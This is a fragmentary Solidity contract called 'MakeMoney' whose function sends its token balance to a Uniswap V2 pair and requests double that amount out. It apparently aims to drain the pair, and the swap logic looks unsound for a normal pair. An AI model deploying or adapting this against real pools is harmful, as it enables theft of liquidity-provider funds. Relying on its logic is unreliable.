...
contract MakeMoney {
    ...
    uint256 public start_a = 1500000000000000000; // 1.5 ether

    function main() external {
        uint256 balance_a = IERC20(address_a).balanceOf(address(this));
        require(balance_a > start_a, "hwbokwtypvjgtmsa: balance_a > 1.5 ether.");
        
        IERC20(address_a).transfer(address_uniswapv2pair_b_a, balance_a);
        IUniswapV2Pair(address_uniswapv2pair_b_a).swap(balance_a * 2, 0, address_ab11, "");
